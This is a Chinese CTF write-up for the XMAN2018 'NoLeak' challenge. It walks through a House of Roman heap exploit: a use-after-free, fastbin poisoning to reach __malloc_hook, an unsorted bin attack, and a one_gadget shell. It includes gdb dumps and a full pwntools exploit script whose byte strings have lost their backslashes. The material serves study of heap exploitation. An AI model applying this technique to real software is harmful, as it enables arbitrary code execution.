# XMAN2018选拔赛之NoLeak

阅读量 **201982**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-07-24 17:00:38

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 前言

这道题没有printf之类的函数可以输出堆块内容，正如其名不存在地址泄露，当时没有任何思路，赛后经大佬指点得知使用了 **House of Roman**
的技巧。

**House of Roman** 技巧的核心是利用 **局部写（低** **12bits** **）来减少随机性** 进而爆破出地址。

## ASLR Low 12 bits

程序虽然开启了 **ASLR** ，但其低 **12bits** 随机化程度较小，观察__malloc_hook 与 main_arena+88 :

    
    
    gef➤  p &__malloc_hook
    
    $1 = (void *(**)(size_t, const void *)) 0x7fbda51e0af0 <__malloc_hook>
    
    gef➤  x/10xg 0x65b160
    
    0x65b160: 0x6363636363636363 0x00000000000000d1
    
    0x65b170: 0x000000000065b020 0x00007fbda51e0b58
    
    0x65b180: 0x6464646464646464 0x6464646464646464
    
    0x65b190: 0x6464646464646464 0x6464646464646464
    
    0x65b1a0: 0x6464646464646464 0x6464646464646464

可以看到仅低12bits不同，因此可以覆盖低16位为固定值（1字节为单位），运行少量次数即可命中13~16位实现爆破。

## 题目分析

NoLeak未开启PIE入口地址为0x400000，GOT表不可写，共享库开启了地址随机化。

    
    
    qts@qts-PC:~/ctf/NoLeak$ checksec NoLeak
    
    [*] '/home/qts/ctf/NoLeak/NoLeak'
    
        Arch:     amd64-64-little
    
        RELRO:    Full RELRO
    
        Stack:    Canary found
    
        NX:       NX disabled
    
        PIE:      No PIE (0x400000)
    
        RWX:      Has RWX segments
    
    qts@qts-PC:~/ctf/NoLeak$ checksec libc-2.24.so
    
    [*] '/home/qts/ctf/NoLeak/libc-2.24.so'
    
        Arch:     amd64-64-little
    
        RELRO:    Partial RELRO
    
        Stack:    Canary found
    
        NX:       NX enabled
    
        PIE:      PIE enabled

题目还是基本的Create、Update、Delete，但是这里没有printf函数显示堆块里面的内容，所以无法泄露堆地址和libc地址。

[](https://p3.ssl.qhimg.com/t01a29974a6217533c9.png)Create操作可以分配任意长度的堆块，堆块数量限制为10个。

[](https://p4.ssl.qhimg.com/t01ec1e7e988a047061.png)

free操作没有将指针清零，导致存在 **UAF** 漏洞。

[](https://p0.ssl.qhimg.com/t0180c613d809ef4805.png)

Update操作可以往堆块内填入任意长度的字符串导致堆块头指针被改写。

[](https://p1.ssl.qhimg.com/t011764741472c93394.png)

## 思路

首先分配5个 **chunk** 分别 **A** **、** **B** **、** **C** **、** **D** **、** **E**
，大小分别为 **0x20** **、** **0xd0** **、** **0x70** **、** **0xd0** **、** **0x70**

在 **B+0x68** 的位置写上 **0x61** ，作用是将B分为 **size = 0x70** 和 **size = 0x60** 的两个块

释放B和D进入 **unsorted bin** ，此时 **B+0x10** 和 **B+0x18** 都有 **main_arena** 的地址

再次分配B，此时 **B+0x10** 处保留 **main_arena** 中的地址， **B- >bk**处保了D的地址（指向D的指针）

释放C和E进入 **size=0x70** 的 **fastbin**

从A块溢出，修改B的 **size** 字段为 **0x71** ，用于绕过 **fastbin** 的大小检查，同时利用 **UAF** 修改E的
**fd** 指针低 **8bits** 为 **0x20** （因为此时堆块之间的偏移是相对固定的），使之指向B（此时B包含了main_arena的地址）

此时 **B- >size = 0x71**， **B+0x68** 的位置写上 **0x61** ，也就构造了 **fake fastbin** 。修改
**B- >fd**的低2字节使fd指向 **malloc_hook-0x23** 处（因为此时 **malloc_hook – 0x23 + 0x8**
处为 **0x7f** 可以绕过fastbin的大小检查）

连续分配三次0x70的块，第三次得到对 **malloc_hook** 写的权限

释放C块进入 **fastbin** ，同时利用 **UAF** 修改 **C- >fd = 0**修复 **fastbin**

此时 **unsorted bin** 里面还剩D，利用 **UAF** 修改 **D- >bk = malloc_hook – 0x10**，为
**unsorted bin attack** 做准备

申请一个与D同样大小的块，触发 **unsorted bin attack** ，在 **malloc_hook** 的位置写入
**main_arena** 的地址

修改 **malloc_hook** 低3字节，使之指向 **one_gadget**

两次释放A触发 **malloc_printerr** 从而触发 **malloc** 最终得到shell

## EXP分析

为了方便调试先关闭ASLR：

    
    
    qts@qts-PC:~/ctf/NoLeak$ sudo sh -c 'echo 
    0 >/proc/sys/kernel/randomize_va_space'

首先创建5个块，并在B块中伪造fast chunk。

    
    
    C(0x10,’a’*0x10)                     #A
    
    C(0xc8,’b’*0x60+p64(0)+p64(0x61))   #B
    
    C(0x68,’c’*0x68)                     #C
    
    C(0Xc8,’d’*0x68)                     #D
    
    C(0X68,’d’*0x68)                     #E

释放B、D进入 **unsorted bin**

    
    
    D(1)
    
    D(3)
    
    C(0xc8,'')               #5 get the address of main_arena

再次分配 **0xd0** 的块，将B从 **unsorted bin** 脱下，此时 **B- >fd = 0x7ffff7dd3b0a**为
**main_arena** 中的地址， **B- >bk = 0x602160**为D的地址（此时D还在 **unsorted bin** 中）

    
    
    gef➤  x/10xg 0x602000
    
    0x602000: 0x0000000000000000 0x0000000000000021        <--  A
    
    0x602010: 0x6161616161616161 0x6161616161616161
    
    0x602020: 0x0000000000000000 0x00000000000000d1        <--  B
    
    0x602030: 0x00007ffff7dd3b0a 0x0000000000602160
    
    0x602040: 0x6262626262626262 0x6262626262626262
    
    gef➤  x/10xg 0x602160
    
    0x602160: 0x6363636363636363 0x00000000000000d1        <--  D
    
    0x602170: 0x00007ffff7dd3b78 0x00007ffff7dd3b78
    
    0x602180: 0x6464646464646464 0x6464646464646464

将C和E释放进入 **fastbin** 中，利用 **UAF**
修改E的fd指针低8bits为0x20使之指向B块（前面调试过程中可以看到B的低8bits为0x20且相对固定不变），同时利用A块的溢出修改B的
**size = 0x71** 绕过后面的fastbin检查（在size = 0x70的fastbin中，所有的chunk的size都必须为
**0x71~0x7f** ）

    
    
    D(2)           #C
    
    D(4)           #E
    
    U(4,1,'x20')                        # fake fastbin chain
    
    U(0,0x19,'e'*0x10+p64(0)+'x71')
    
    U(1,0x2,__malloc_hook_up)

同样修改 **B- >fd**字段的低2字节使之指向 **__malloc_hook – 0x23** （因为之前 **B- >fd**已经是
**main_arena** 中的地址，所以只要修改低2字节就可以使之指向），这样就在 **__malloc_hook** 附近也伪造了一个 **fast
chunk**

    
    
    gef➤  x/10xg 0x602020 + 0xd0                  # B+0xd0 ，C块
    
    0x6020f0: 0x00000000000000d0 0x0000000000000071
    
    0x602100: 0x0000000000000000 0x6363636363636363       # C->fd = NULL
    
    0x602110: 0x6363636363636363 0x6363636363636363
    
    gef➤  x/10xg 0x6020f0 + 0xd0 + 0x70           # C+0xd0+0x70 ，E块
    
    0x602230: 0x00000000000000d0 0x0000000000000070
    
    0x602240: 0x0000000000602020 0x6464646464646464      # E->fd 指向 B
    
    0x602250: 0x6464646464646464 0x6464646464646464
    
    gef➤  x/10xg 0x602020                         # B块
    
    0x602020: 0x0000000000000000 0x0000000000000071      # B->size已被修改为0x70
    
    0x602030: 0x00007ffff7dd3aed 0x0000000000602160      # B->fd 指向 malloc_hook - 0x23
    
    0x602040: 0x6262626262626262 0x6262626262626262
    
    gef➤  x/10xg 0x00007ffff7dd3aed               # malloc_hook - 0x23
    
    0x7ffff7dd3aed: 0xfff7dd2260000000 0x000000000000007f     # malloc_hook - 0x23 + 0x8 处为0x71，绕过fastbin大小检查
    
    0x7ffff7dd3afd: 0xfff7a953f0000000 0xfff7a94fd000007f

此时fastbin的结构为：[](https://p5.ssl.qhimg.com/t0105eb7d7bfb374bb1.png)

三次分配得到对 **malloc_hook** 的修改权限

    
    
    C(0x68,'f'*0x68)
    
    C(0x68,'g'*0x8)
    
    C(0x68,'h'*0x8)

再次释放C块，利用 **UAF** 修改 **C- >fd = NULL** 修复fastbin，否则再次分配堆块的时候会报错

    
    
    D(2)
    
    U(2,8,p64(0))

接下来就是 **unsorted bin attack** ，D一直在unsorted bin中，利用UAF修改 **D- >bk**低3字节，使之指向
**malloc_hook – 0x10** ，再次分配0xd0的块使D脱链触发unsorted bin
attack，从而在malloc_hook处写入main_arena的地址

    
    
    U(3,0xa,'asasasas'+__malloc_hook)
    
    C(0xc8,'')
    
    gef➤  p &__malloc_hook
    
    $2 = (<data variable, no debug info> *) 0x7ffff7dd3b10 <__malloc_hook>
    
    gef➤  x/10xg 0x7ffff7dd3b10
    
    0x7ffff7dd3b10 <__malloc_hook>: 0x00007ffff7dd3b78 0x0000000000000000
    
    0x7ffff7dd3b20: 0x0000000000000000 0x0000000000000000

修改malloc_hook低3字节指向 **one_gadget** ，连续两次释放A块（double free）触发
**malloc_printerr** 进而触发malloc，最终getshell。

    
    
    one4 = 'xf4xf9xaf'
    
    U(8,0×16,’a’*0x13+one4)
    
    D(0)
    
    D(0)
    
    p.interactive()
    
    qts@qts-PC:~/ctf/NoLeak$ ./exp.py
    
    [+] Starting local process './NoLeak': pid 13358
    
    [*] '/home/qts/ctf/NoLeak/NoLeak'
    
        Arch:     amd64-64-little
    
        RELRO:    Full RELRO
    
        Stack:    Canary found
    
        NX:       NX disabled
    
        PIE:      No PIE (0x400000)
    
        RWX:      Has RWX segments
    
    malloc_hook get !
    
    [*] Switching to interactive mode
    
    *** Error in `./NoLeak': double free or corruption (fasttop): 0x0000000000602010 ***
    
    $ whoami
    
    qts
    
    $

以上为关闭ASLR的调试结果

## 总结

**House of Roman** 仅需 **UAF** 和 **分配任意大小的堆块** 就可以getshell。最具技巧的部分还是 **局部地址写**
，之所以这样是应为ASLR本身并不能完全随机化，可以修改部分位绕过ASLR。

有不当之处请大家指正。

## 参考

<https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc>[__](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc)

<https://pan.baidu.com/s/1Ns27DuU8dc6BAEmvnqkwyQ>

## 利用脚本

    
    
    #!/usr/bin/env python2.7
    
    from pwn import *
    
    import pwnlib
    
    #p = process('./NoLeak',env={"LD_PRELOAD":"./libc-2.24.so"})
    
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    #libc = ELF('libc-2.23.so')
    
    p = process('./NoLeak',env={"LD_PRELOAD":"./libc-2.23.so"})
    
    #p = process('./NoLeak')i
    
    elf = ELF('NoLeak')
    
    def C(size,data):
    
        p.recvuntil('Your choice :')
    
        p.sendline(str(1))
    
        p.recvuntil('Size: ')
    
        p.sendline(str(size))
    
        p.recvuntil('Data: ',timeout=1)
    
        p.sendline(data)
    
    def D(index):
    
        p.recvuntil('Your choice :',timeout=1)
    
        p.sendline(str(2))
    
        p.recvuntil('Index: ')
    
        p.sendline(str(index))
    
    def U(index,size,data):
    
        p.recvuntil('Your choice :',timeout=1)
    
        p.sendline(str(3))
    
        p.recvuntil('Index: ',timeout=1)
    
        p.sendline(str(index))
    
        p.recvuntil('Size: ',timeout=1)
    
        p.sendline(str(size))
    
        p.recvuntil('Data: ')
    
        p.sendline(data)
    
    def g():
    
        pwnlib.gdb.attach(p)
    
        raw_input()
    
    __malloc_hook = 'x00x3b'
    
    __malloc_hook_up = 'xedx3a'        # beg for lucky!!
    
    C(0x10,'a'*0x10)                     #0
    
    C(0xc8,'b'*0x60+p64(0)+p64(0x61))    #1
    
    C(0x68,'c'*0x68)                     #2
    
    C(0Xc8,'d'*0x68)                     #3
    
    C(0X68,'d'*0x68)                     #4
    
    D(1)
    
    D(3)
    
    C(0xc8,'')                           #5 get the address of main_arena
    
    D(2)
    
    D(4)
    
    U(4,1,'x20')                        # fake fastbin chain
    
    U(0,0x19,'e'*0x10+p64(0)+'x71')
    
    U(1,0x2,__malloc_hook_up)
    
    C(0x68,'f'*0x68)                     #6
    
    C(0x68,'g'*0x8)                      #7
    
    C(0x68,'h'*0x8)                      #8 get the space over malloc_hook
    
    print "malloc_hook get ! "
    
    D(2)                                 # link into fastbin
    
    U(2,8,p64(0))                        # fix fastbin
    
    U(3,0xa,'asasasas'+__malloc_hook)
    
    C(0xc8,'')                           #9
    
    one4 = 'xf4xf9xaf'
    
    D(0)
    
    D(0)
    
    p.interactive()
    
    D(0)
    
    D(0)
    
    p.interactive()

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **极目楚天舒** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/152562](/post/id/152562)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF pwn](/tag/CTF pwn)
  * [堆利用](/tag/堆利用)
  * [XMAN2018选拔赛](/tag/XMAN2018选拔赛)

 **+1** __16赞

 __收藏

![](https://p4.ssl.qhimg.com/t01aea30b17df4b8d2f.png) 极目楚天舒

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

